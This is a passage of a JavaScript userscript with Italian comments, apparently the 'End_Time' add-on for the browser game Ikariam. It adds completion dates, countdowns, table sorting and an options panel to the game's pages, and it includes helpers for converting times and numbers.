		for(jj=rowTab.length; jj>=1 ; jj--)							//cicla per spostare le righe
		{
			var selRow = $('#js_MilitaryMovementsFleetMovementsTable tr:has(td[name='+ jj +'])')
			rowTab.eq(0).after(selRow.clone())						//sposta righe sotto la prima
			selRow.remove()											//rimuove vecchia riga
		}
	}

	$('#js_MilitaryMovementsFleetMovementsTable tr:odd').attr('class','own')
	$('#js_MilitaryMovementsFleetMovementsTable tr:even').attr('class','alt own')
	
	$('#js_MilitaryMovementsFleetMovementsTable div.ETsortTab').attr('class','ETnosortTab')
	$('#js_MilitaryMovementsFleetMovementsTable th:eq('+ indexCol +') div').attr('class','ETsortTab')
	sortMilitaryClass()
}

function sortMilitaryClass()		//imposta classi per i pulsanti di ordina tabella
{
	$('#js_MilitaryMovementsFleetMovements th div.ETsortTab').css({'background':'url("/skin/dropdown/select_citynav.jpg") no-repeat scroll -158px -30px transparent'});	//va bene anche -55px
	$('#js_MilitaryMovementsFleetMovements th div.ETnosortTab').css({'background':'url("/skin/dropdown/select_citynav.jpg") no-repeat scroll -158px -54px transparent'});
}

// FINESTRA RICERCHE
function advisorResearchSet()		//inserisco data fine ricerca nella finestra Ricerche
{
	var researchBtn = $('#js_researchAdvisorConservationLink.invisible')	//seleziona pulsante ricerca invisible
	var endDate = $('#ETresearchDate')
	if (endDate.length <= 0 && researchBtn.length > 0)
	{
		$('#js_researchesOfTypeDetails').after(		//inserisce nodo HTML per la data
			'<div id="ETresearchLine">'+
				'<span class="desc floatleft">'+ ET_lang.advResearch +'</span>'+
				'<p class="txt">'+
					'<span id="ETresearchDate" style="font-weight:bold" class="green"></span>'+
				'</p>'+
			'</div>');
		setTimeout(ResearchDataSet,1000)	//aspetta 1sec poi inserisce la data
	}
	else if(researchBtn.length <= 0)	{$('#ETresearchLine').remove()}
	else if(endDate.length>0)			{ResearchDataSet()}					//inserisce data
	
	$('#researchAdvisorSidebar a').click(function()			//se si cambia tipo di ricerca ricalcola la data
	{
		nEvent.push(5);		//valore 5 per data fine ricerca
		setEvent()	
	});
}

function ResearchDataSet()			//inserisco data fine ricerca nella finestra Ricerche
{
	newDate = getDate();
	var idResearch = $('#researchAdvisorSidebar a.active').attr('id').replace(/\D/g,'');
	var rtime = CountertoRealTime($('#js_researchAdvisorCountdown'+ idResearch).text());	//calcola tempo in secondi
	$('#ETresearchDate').text(realTimetoDate(newDate + (rtime * 1000) ,false));				//inserisce nella finestra la data
}

//	FINESTRA BILANCIO
function FinancesSet() 				//inserisce data fine denaro in caso di bilancio negativo
{
	if($('#finances td:last span.red').length > 0 && $('#ETfinances').length <= 0)
	{
		var gold = $('#js_GlobalMenu_gold').attr('title').replace(/\D/g,'')*1;
		var result = $('#finances td:last').text().replace(/[^\d^-]/g,'') *1;
		var rDate = parseInt(getDate()+ new Date(((gold/Math.abs(result))*60*60)*1000).getTime())
		var date = realTimetoDate(rDate);
		$('#finances table.table01:last tr.result td.bar').html('<div id="ETfinances" class="red"><span name="ET_cntdw" value='+ rDate +' class="bold"></span> - '+ date +'</div>').css('text-align','right');
		
		// countdown
		ET_Counter('','',' - ');
		ET_t_cnt = setInterval(ET_Counter,5000,'','',' - ');
		$(window).unload(function() {clearInterval(ET_t_cnt)});	// delete countdown
	}
}

//	FINESTRA OPZIONI
function OptionsSet()				//nel tab opzioni gioco visualizza le opzioni dello script
{
	if ($('#options').length <=0 || $('#EToptions').length > 0) return;	//esco se non esiste la finestra opzioni
	
	$('#tabGameOptions div.contentBox01h:first').before(
		"<div id='EToptions' class='contentBox01h'>" +
			"<h3 class='header'>"+
				"<a href='http://userscripts.org/scripts/show/52268' target='_blank' style='font-weight:700'>End_Time v "+ verScript +"</a>"+
				"<span style='font-size:10px;'>  by <a href='http://userscripts.org/users/95943' target='_blank'>Phate72</a></span>"+
			"</h3>"+
			"<div class='content'>"+
				"<table class='table01'>"+
					"<tbody>"+
						"<tr>" +
							"<td class='vertical_top'>"+ ET_lang.formatTime +"</td>" +
							"<td id='ET_typHour' class='left'>"+
								"<div class='margin10 clearfix'>"+
									"<div id='Img' class='checkbox radio floatleft' value=0></div>"+
									"<span class='smallFont floatleft checkbox_label'>24h</span>"+
								"</div>"+
								"<div class='margin10 clearfix'>"+
									"<div id='Img' class='checkbox radio floatleft' value=1></div>"+
									"<span class='smallFont floatleft checkbox_label'>12h</span>"+
								"</div>"+
							"</td>"+
						"</tr>" +
						"<tr>" +
							"<td class='vertical_top'>"+ ET_lang.viewBuildBar +"</td>" +
							"<td id='ET_viewBuildBar' class='left'>"+
								"<div class='margin10 clearfix'>"+
									"<div id='Img' class='checkbox radio floatleft' value=0></div>"+
									"<span class='smallFont floatleft checkbox_label'>"+ $('#tabGameOptions span.checkbox_label:first').text() +"</span>"+
								"</div>"+
								"<div class='margin10 clearfix'>"+
									"<div id='Img' class='checkbox radio floatleft' value=1></div>"+
									"<span class='smallFont floatleft checkbox_label'>"+ $('#tabGameOptions span.checkbox_label').eq(1).text() +"</span>"+
								"</div>"+
							"</td>"+
						"</tr>" +
						"<tr>" +
							"<td class='vertical_top'>"+ ET_lang.viewResourceBar +"</td>" +
							"<td id='ET_viewResourceBar' class='left'>"+
								"<div class='margin10 clearfix'>"+
									"<div id='Img' class='checkbox radio floatleft' value=0></div>"+
									"<span class='smallFont floatleft checkbox_label'>"+ $('#tabGameOptions span.checkbox_label:first').text() +"</span>"+
								"</div>"+
								"<div class='margin10 clearfix'>"+
									"<div id='Img' class='checkbox radio floatleft' value=1></div>"+
									"<span class='smallFont floatleft checkbox_label'>"+ $('#tabGameOptions span.checkbox_label').eq(1).text() +"</span>"+
								"</div>"+
							"</td>"+
						"</tr>" +
					"</tbody>"+
				"</table>" +
				"<div class='footer'></div>" +
			"</div>"+
		"</div>");
	//eventi formato ora 24h o 12h
	var typHour = localStorage.getItem('ET_typHour');	//carica impostazioni tipo Ora
	if (typHour == null) typHour = 0;					//se non esiste imposta formato ora a 24h
	$('#ET_typHour div.checkbox[value='+ typHour +']').addClass('checked')
	$('#ET_typHour div.checkbox').click(function()
	{
		$('#ET_typHour div.checkbox').removeClass('checked');		//tolgo classe selezione div
		$(this).addClass('checked');								//aggiungo classe selezione a elemento cliccato
		localStorage.setItem('ET_typHour',$(this).attr('value'));	//carica impostazioni tipo Ora
	});
	//eventi visualizzazione barra edifici
	var viewBuildBar = localStorage.getItem('ET_viewBuildBar');	//carica impostazioni visualizzazioni barra edifici
	if (viewBuildBar == null) viewBuildBar = 0;					//se non esiste imposta visualizza barra edifici
	$('#ET_viewBuildBar div.checkbox[value='+ viewBuildBar +']').addClass('checked')
	$('#ET_viewBuildBar div.checkbox').click(function()
	{
		$('#ET_viewBuildBar div.checkbox').removeClass('checked');		//tolgo classe selezione div
		$(this).addClass('checked');									//aggiungo classe selezione a elemento cliccato
		localStorage.setItem('ET_viewBuildBar',$(this).attr('value'));	//carica impostazioni visualizzazioni barra edifici
	});
	//eventi visualizzazione barra risorse
	var viewResourceBar = localStorage.getItem('ET_viewResourceBar');	//carica impostazioni visualizzazioni barra edifici
	if (viewResourceBar == null) viewResourceBar = 0;					//se non esiste imposta visualizza barra edifici
	$('#ET_viewResourceBar div.checkbox[value='+ viewResourceBar +']').addClass('checked')
	$('#ET_viewResourceBar div.checkbox').click(function()
	{
		$('#ET_viewResourceBar div.checkbox').removeClass('checked');		//tolgo classe selezione div
		$(this).addClass('checked');									//aggiungo classe selezione a elemento cliccato
		localStorage.setItem('ET_viewResourceBar',$(this).attr('value'));	//carica impostazioni visualizzazioni barra edifici
	});
}

//	CONVERSIONI
function setUnit()							// carico unità di misure tempo e separatore centinaia
{
	if (ETunt.length == 0)
	{
		//prelevo dalla pagina le unità di misura
		ETunt[0] = unsafeWindow.LocalizationStrings.timeunits.short.day;
		ETunt[1] = unsafeWindow.LocalizationStrings.timeunits.short.hour;
		ETunt[2] = unsafeWindow.LocalizationStrings.timeunits.short.minute;
		ETunt[3] = unsafeWindow.LocalizationStrings.timeunits.short.second;
		ETunt[4] =  unsafeWindow.LocalizationStrings.thousandSeperator;
	}
}

function replaceNum(num) 					// trasforma un numero 123456 in una stringa con formato 123,456 
{
	setUnit()	//carico unità tempo
	var sign=(num < 0)? '-':'';
	var multi ='';
	num = Math.abs(num);
	if (num> 1000000)
	{
		num= parseInt(num/1000);
		multi ='k';
	}
	var string = String(Math.abs(num));
	for ( j=string.length-3 ; j > 0; j = j-3)
		{string = string.substring(0 , j) + ETunt[4] + string.substring(j , string.length)}
	return sign + string + multi;
}

function CountertoRealTime(string)			//converte una stringa "2h 40m 23s" in un tempo espresso in secondi
{
	setUnit()	//carico unità tempo
	var addtime=0;
	if (string != null && string != undefined)
	{
		var tms = string.split(' ');
		for (var j = 0 ; j < (tms.length) ; j++)
		{
			if (tms[j].indexOf(ETunt[3]) >= 0  && j == tms.length-1) {addtime += parseInt(tms[j]);}	//Second
			else if (tms[j].indexOf(ETunt[2]) >= 0) {addtime += parseInt(tms[j])*60;}				//Minutes
			else if (tms[j].indexOf(ETunt[1]) >= 0) {addtime += parseInt(tms[j])*60*60;}			//Hour
			else if (tms[j].indexOf(ETunt[0]) >= 0) {addtime += parseInt(tms[j])*60*60*24}			//Day
		}
	}
	return addtime;
}

function RealTimetoCounter(rtime,trimtime)	//converte il tempo (sec) in una stringa "2h 40m 23s"
{ 
	//trimtime serve per selezionare la precisione della visualizzazione 2,3,4
	//converte il numero in giorni ore minuti e secondi
	setUnit()	//carico unità tempo	
	var nTime=[];				//array per giorni ore minuti secondi
	var kT =[86400,3600,60,1];	//costanti per il calcolo
	for (var j=0; j<4; j++)
	{
		nTime[j] = parseInt(rtime / kT[j]);
		
		rtime -= nTime[j] * kT[j];
	}

	//crea stringa orario
	var t =0;
	var string ='';
	for (j=0; j<4; j++)
	{
		if (nTime[j] > 0) 
		{
			string += nTime[j] + ETunt[j] + ' ';
			t++;
		}
		if (trimtime == t) break;
	}
	return string
}

function realTimetoDate(rdate,secOn)		//converte una data in formato millisecondi in una data dd.mmm.yy
{
	var endtxt = "";		
	var tdy = new Date();		// oggi
	var end = new Date (rdate)	//data di fine evento in millisecondi
	var tdyD = tdy.getDate(), tdyM = tdy.getMonth(), tdyY = tdy.getFullYear();	//giono mese anno di oggi
	var endD = end.getDate(), endM = end.getMonth(), endY = end.getFullYear();	//giorno mese e anno di fine evento
		
	if ( (endD != tdyD) || (endM != tdyM) )	//aggiunge giorno e mese se differente da oggi
	{
		//se c'è solo un giorno di differenza al posto della data mette 'domani'
		if ( endD == (tdyD + 1) && endM == tdyM && endY == tdyY) endtxt = ET_lang.tomorrow
		else
		{
			endtxt = endD + "." + ET_lang.month[endM] ;	//aggiuge giorno e mese
			if (endY != tdyY) endtxt += "." + endY;		//aggiunge anno
		}
		endtxt+=" ";
	}
	//tipo orerio se 12h o 24h (24h =0 e 12h =1)
	var typHour = localStorage.getItem('ET_typHour');	//carica impostazioni tipo Ora
	if (typHour == null) typHour = 0;					//se non esiste imposta formato ora a 24h
	var ampm =[' ',' am',' pm']
	var hour = end.getHours()
	if (typHour == 1 && hour > 12)
	{
		typHour=2;				//indice per inserire 'pm'
		hour = hour-12;		//toglie ore per formato 12h
	}
	endtxt += hour;													//aggiunge ora
	endtxt += ":" + numDate(end.getMinutes());						//aggiuge minuti
	//se richiesto calcola i secondi
	if (secOn == true) endtxt += ":" + numDate(end.getSeconds());	//aggiunge secondi
	endtxt += ampm[typHour];											//aggiungo PM o AM per formato 12h
	
	return endtxt
}

function numDate(num)						//converte i numeri sempre in stringa con due caratteri 1=01 12=12
{
	if (num < 10) {num = "0" + num;}
	return num
}

// DATA SERVER
function getDate() //data attuale del server
{ 
	var eventDate = (new Date()).getTime();	//data attuale del computer
	//carica la data del server al momento del caricamento pagina e somma i secondi intercorsi fra il cariamento e l'evento
	var rdate = (unsafeWindow.dataSetForView.serverTime * 1000) + (eventDate - loadDate)
	return rdate;
}

//	CONTATORI
// Countdown per stringhe tempo del tipo '2h 23m 12s'
var ET_t_cnt;
function ET_Counter(pretxt,posttxt,nvrtxt)
{
	newDate = getDate();
	var node = $('span[name=ET_cntdw]')
	if(node.length<=0)	clearInterval(ET_t_cnt);	//esce dal ciclo
	node.each(function()
	{
		dateEnd = $(this).attr('value');
		if (dateEnd !=null && dateEnd > newDate)
		{
			var txtTime = RealTimetoCounter((dateEnd-newDate)/1000,2)
			$(this).html(pretxt + txtTime + posttxt);
		}
		else if(dateEnd <= newDate)	{
			$(this).text(nvrtxt);		//inserisce testo di fine countdown
			$(this).attr('name','');	//cambia nome per togliere il nodo dal ciclo
		}	
	});
}

// Restituisce data del tipo '1.gen.2010 22:15', tenendo conto del tempo passato ad intervalli di 2sec
var ET_t_date;
function ET_Date(sec) 
{
	newDate = getDate();
	var node = $('span[name=ET_incDate]')
	if(node.length<=0)	clearInterval(ET_t_dt);	//esce dal ciclo
	node.each(function()						//ricalcola tutte le date
	{
		var time = $(this).attr('value') *1000;
		$(this).text(realTimetoDate( newDate + time ,sec))
	});
}

// VERIFICARE UTILITA' E POSSIBILI MIGLIORAMENTI

function calcuPort()	// calcola il tempo di caricamento navi
{ 			
	// Calculate loading times	   0	 		   5				   10				   15					  20					   25					    30						 35						   40
	const loadingspeed = new Array(10,30,60,93,129,169,213,261,315,373,437,508,586,672,766,869,983,1108,1246,1398,1565,1748,1950,2172,2416,2685,2980,3305,3663,4056,4489,4965,5488,6064,6698,7394,8161,9004,9931,10951,12073,13308);
	// calcola la velocità di caricamento
	var speed = 0;
	$('#locations div.port').each(function()
	{
		
		var lvlport = $(this).attr('class').replace(/\D/g,'') *1
		if(lvlport <= 41) speed += loadingspeed[lvlport]
		else if (lvlport > 41) speed += loadingspeed[41]
	});
	if (speed == 0) speed = 10
	
	return speed
}

